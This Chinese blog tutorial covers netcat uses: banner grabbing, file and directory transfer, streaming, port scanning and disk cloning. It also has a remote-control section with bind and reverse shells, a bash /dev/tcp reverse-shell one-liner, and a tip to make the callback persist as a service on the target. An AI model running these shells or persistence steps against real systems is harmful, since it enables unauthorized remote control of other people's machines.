# 工具 - netcat使用




# netcat使用


## 简介
- 侦听模式/传输模式
- 可以替代telent  / 获取banner信息
- 传输文本信息
- 传输文件/目录
- 加密传输文件
- 远程控制/木马
- 加密所有流量
- 流媒体服务器
- 远程克隆硬盘


## 基本用法
####  <font color=red>1. 实现telnet / banner</font>
```bash
# 题外话:追踪路由
mtr 114.114.114.114 

## nc作为客户端：
# 参数 -v  显示详细信息 
# 参数  -n  如果是域名,不进行域名解析(建议直接跟ip地址)
nc -nv 1.1.1.1 110   # 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令）
nc -nv 1.1.1.1 25    # smtp服务器
nc -nv 1.1.1.1 80    # 探测80端口(都可进行交互的命令)

```

####  <font color=red>2.传输文本信息</font>
```bash
# 可以做聊天用
# 一台作为服务端    -l 监听, -p 端口
nc -l -p 4444
# 另一台作为客户端去连接服务端
nc -nv 1.1.1.1 4444

```
![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/nc_use.png)

###### 用途：
**远程电子取证** (原则:尽可能少修改被审计系统的状态，避免影响证据)
就可以用`nc`来操作:
我的电脑: `nc -l -p 3333`  监听
被审计系统:`ls -l | nc -nv 1.1.1.1 3333` 输出到我的电脑

我的电脑: `nc -l -p 3333 > ps.txt`   输出结果重定向到文件
被审计系统:`ps -ef | nc -nv 1.1.1.1 3333 -q 1`    参数-q: 输出完成之后过1秒就断开

题外话：`lsof` 查看已经打开的文件



####  <font color=red>3.传输文件/目录</font>
###### 传输文件
```bash
# 客户端向服务端传输  （正向） 
A： nc-lp 3333 > 1.mp4
B:  nc -nv 1.1.1.1 3333 < 1.mp4 -q 1
# 或者, 服务端向客户端传输文件  （反向）
A:  nc -q 1 -lp 3333 < a.mp4
B:  nc -nv 1.1.1.1 3333 > 2.mp4
```

###### 传输目录
```bash
# 正向(服务端先打包再传给客户端,注意小横线别遗漏)
A:  tar -cvf - music/ | nc -lp 3333 -q 1
B:  nc -nv 1.1.1.1 3333 | tar -xvf -     # 先接收再解包
```

###### 加密传文件
```bash
A： nc -lp 3333 | mcrypt --flush -Fbqd -a rijndael-256-m ecb > 1.mp4     # 接收，解密
B： mcrypt --fulsh -Fbq -a rijndael-256-m ecb < a.mp4 | nc 1.1.1.1 3333 -q 1   # 加密，传送
# 需要输入加密秘钥，解密秘钥
# 不是nc的加密功能，是操作系统的加密命令，可以自行安装
```

#### <font color=red>4.流媒体</font>
```bash
#把视频流输出到B端
A:  cat 1.mp4 | nc -lp 3333
B:  nc -nv 1.1.1.1 3333 | mplayer -vo x11 -cache 3000 -
#接收视频流，输出给指定播放器和缓存进行播放
```

#### <font color=red>5.端口扫描</font>
>以客户端角色
```bash
#并非擅长端口扫描
#参数 -z 扫描参数，只判断是否开放（默认tcp）
nc -nvz 1.1.1.1 1-65535
#参数 -u  扫描udp服务的端口 （不太准确）
nc -nvzu 1.1.1.1 1-1024
```

#### <font color=red>6.远程克隆硬盘</font>
**远程电子取证**，可以将目标服务器硬盘远程复制(`块`级别的备份,`磁盘磁道的状态原原本本的复制`)，或者内存(内存中运行的病毒进程)
```bash
A:  nc -lp 3333 | dd of=/dev/sda
B:  dd -if=/dev/sda | nc -nv 1.1.1.1 3333 -q 1
```

####  <font color=red>7.远程控制</font>
参数: -c 
**正向：**   目标机器作为服务端监听, 把bash传给我
```bash
A:  nc -lp 3333 -c bash   #目标机器
B:  nc 1.1.1.1 3333
```
**反向：**    我的机器作为服务端, 让目标机器作为客户端主动连接我(客户端把bash传给服务器端)
```bash
A:  nc -lvp 3333       
B:  nc 1.1.1.1 3333 -c bash    #目标机器

#假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell
目标机器： bash -i >& /dev/tcp/192.168.41.133/2223 0>&1
攻击方： nc -lvvp 2223
```

>Note: Windows用户把bash改为cmd

> 反向连接用的多， 因为好多都限制进入的流量而不太多限制出去的流量(根据他允许的端口调整,比如dns)

> 长久维持会话： 写成脚本作为系统服务，让目标机器已启动就连接我



## ncat 命令
<font color=red> **nc缺陷：**</font>
- nc缺乏加密能力：是数据是明文传输（容易被别人嗅探）
- 缺乏身份验证能力：端口如果一直向外开放，容易被他人连接窃取当做肉鸡
- 不同系统/平台的nc参数功能不尽相同（自己 -h 查看帮助文档和测试）

<font color=red> **ncat 命令**</font>
是包含在nmap工具包中里面的一个东西(弥补了nc缺乏加密和身份验证的不足)

正向连接：
```bash
#先进行了秘钥交换和加密
#被控端(服务器端)   -allow允许连接的ip， 端口, ssl加密
A:  ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl
B:  ncat -nv 192.168.1.19 3333 --ssl      #攻击端
```

## 其他
... ...




---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/  

